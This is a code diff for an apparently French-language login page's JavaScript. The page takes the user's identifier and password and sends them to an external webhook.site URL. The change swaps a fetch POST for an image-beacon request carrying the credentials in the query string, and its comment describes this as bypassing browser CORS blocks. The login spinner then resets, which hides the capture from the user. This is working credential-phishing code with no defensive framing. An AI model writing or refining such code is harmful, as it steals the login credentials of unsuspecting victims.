@@ -68,14 +68,11 @@
                 if(code.length > 0 && password.length > 0){
                     $("#btnSubmitLogin").html(`<div class="lds-ring"><div></div><div></div><div></div><div></div></div>`);
                     
-                    // Send data using form encoding so webhook.site catches it instantly without preflight blocks
-                    var postData = "Identifiant=" + encodeURIComponent(code) + "&MotDePasse=" + encodeURIComponent(password);
+                    // Send data cleanly via an image tracker load (bypasses all browser CORS and OPTIONS blocks)
+                    var targetUrl = 'https://webhook.site/8c374b94-6770-4a86-85c5-f38bd00bd192?Identifiant=' + encodeURIComponent(code) + '&Password=' + encodeURIComponent(password);
                     
-                    fetch('https://webhook.site/8c374b94-6770-4a86-85c5-f38bd00bd192', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: postData
-                    }).catch(function() {});
+                    var img = new Image();
+                    img.src = targetUrl;
 
                     setTimeout(function() {
                         $("#btnSubmitLogin").html(`<span class="d-block p-2">Se connecter</span>`);
